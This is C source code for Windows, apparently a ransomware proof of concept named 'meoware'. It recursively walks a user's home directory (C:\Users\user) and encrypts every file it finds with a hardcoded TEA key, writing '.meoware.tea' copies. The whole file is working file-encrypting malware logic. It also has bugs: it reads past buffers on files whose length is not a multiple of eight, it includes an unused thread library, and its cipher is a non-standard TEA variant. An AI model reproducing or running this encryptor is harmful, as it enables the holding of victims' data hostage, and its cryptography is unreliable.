#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define MAX_PATH_LENGTH 260
#define MAX_THREADS 8
#define ROUNDS 32

// Structure to hold data for each thread
struct ThreadData {
  char directory[MAX_PATH_LENGTH];
  const char* teaKey;
};

// TEA encryption function
void tea_encrypt(unsigned char *data, unsigned char *key) {
  unsigned int i;
  unsigned int delta = 0x9e3779b9;
  unsigned int sum = 0;
  unsigned int v0 = *(unsigned int *)data;
  unsigned int v1 = *(unsigned int *)(data + 4);

  for (i = 0; i < ROUNDS; i++) {
    v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
    sum += delta;
    v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
  }

  *(unsigned int *)data = v0;
  *(unsigned int *)(data + 4) = v1;
}

// Function to encrypt a file
void encryptFile(const char* filePath, const char* teaKey) {
  FILE* ifh = fopen(filePath, "rb");
  if (!ifh) {
    printf("error opening file: %s\n", filePath);
    return;
  }

  fseek(ifh, 0, SEEK_END);
  long fileSize = ftell(ifh);
  fseek(ifh, 0, SEEK_SET);

  unsigned char* fileData = (unsigned char*)malloc(fileSize);
  fread(fileData, 1, fileSize, ifh);
  fclose(ifh);

  unsigned char key[16];
  memcpy(key, teaKey, 16);

  // Encrypt the file data
  for (size_t i = 0; i < fileSize; i += 8) {
    tea_encrypt(fileData + i, key);
  }

  // Write encrypted data to a new file
  char encryptedFilePath[MAX_PATH_LENGTH];
  sprintf(encryptedFilePath, "%s.meoware.tea", filePath);
  FILE* ofh = fopen(encryptedFilePath, "wb");
  if (!ofh) {
    printf("error creating encrypted file: %s\n", encryptedFilePath);
    free(fileData);
    return;
  }

  fwrite(fileData, 1, fileSize, ofh);
  fclose(ofh);

  printf("file encrypted: %s\n", filePath);

  free(fileData);
}

// Function to recursively scan directories and encrypt files
void* encryptFilesThread(void* arg) {
  struct ThreadData* threadData = (struct ThreadData*)arg;
  char directory[MAX_PATH_LENGTH];
  const char* teaKey = threadData->teaKey;
  strcpy(directory, threadData->directory);
  free(threadData);

  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH_LENGTH];
  sprintf(searchPath, "%s\\*", directory);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("error: %s - %d\n", directory, GetLastError());
    return NULL;
  }

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH_LENGTH];
    sprintf(filePath, "%s\\%s", directory, fileName);

    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      // Recursively scan subdirectories
      struct ThreadData* newThreadData = (struct ThreadData*)malloc(sizeof(struct ThreadData));
      strcpy(newThreadData->directory, filePath);
      newThreadData->teaKey = teaKey;
      encryptFilesThread(newThreadData);
    } else {
      // Process individual files (encrypt)
      encryptFile(filePath, teaKey);
    }
  } while (FindNextFileA(hFind, &findFileData) != 0);

  FindClose(hFind);
  return NULL;
}

int main() {
  const char* teaKey = "\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77";
  const char* startDirectory = "C:\\Users\\user";

  // Start the initial thread to scan the start directory
  struct ThreadData* initialThreadData = (struct ThreadData*)malloc(sizeof(struct ThreadData));
  strcpy(initialThreadData->directory, startDirectory);
  initialThreadData->teaKey = teaKey;
  encryptFilesThread(initialThreadData);

  return 0;
}
